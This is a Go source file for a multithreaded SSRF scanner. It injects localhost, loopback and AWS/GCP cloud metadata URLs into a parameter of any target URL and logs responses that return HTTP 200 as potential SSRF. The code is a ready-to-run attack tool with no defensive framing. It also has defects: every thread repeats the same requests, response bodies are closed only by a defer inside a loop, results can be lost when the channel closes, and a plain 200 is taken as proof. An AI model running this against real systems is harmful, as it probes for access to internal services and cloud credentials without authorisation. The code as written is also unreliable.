package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sync"
)

// Payloads for testing SSRF
var payloads = []string{
	"http://localhost/",
	"http://127.0.0.1/",
	"http://169.254.169.254/",          // AWS Metadata IP
	"http://metadata.google.internal/", // GCP Metadata
	"http://[::1]/",
}

// SSRFTest sends requests with a payload to a target URL
func SSRFTest(baseURL, param string, results chan<- string) {
	for _, payload := range payloads {
		ssrfURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))

		resp, err := http.Get(ssrfURL)
		if err != nil {
			fmt.Printf("[ERROR] Failed request to: %s\n", ssrfURL)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			results <- fmt.Sprintf("[POTENTIAL SSRF] URL: %s | Status Code: %d", ssrfURL, resp.StatusCode)
		}
	}
}

func main() {
	// Command-line flags
	targetURL := flag.String("url", "", "Base URL to test for SSRF")
	param := flag.String("param", "url", "Parameter to test for SSRF")
	outputFile := flag.String("o", "ssrf_results.txt", "File to save the results")
	threadCount := flag.Int("t", 5, "Number of concurrent threads")
	flag.Parse()

	if *targetURL == "" {
		fmt.Println("Usage: go run main.go -url <target_url> -param <parameter> [flags]")
		os.Exit(1)
	}

	// Prepare concurrency
	results := make(chan string)
	var wg sync.WaitGroup

	// Open output file
	file, err := os.Create(*outputFile)
	if err != nil {
		fmt.Printf("Error creating output file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	// Goroutine to collect results and write to file
	go func() {
		for result := range results {
			fmt.Println(result)
			writer.WriteString(result + "\n")
		}
	}()

	// Launch Goroutines for SSRF testing
	sem := make(chan struct{}, *threadCount)
	for i := 0; i < *threadCount; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			SSRFTest(*targetURL, *param, results)
		}()
	}

	// Wait for all threads to finish
	wg.Wait()
	close(results)

	fmt.Printf("\nSSRF testing completed. Results saved to %s\n", *outputFile)
}
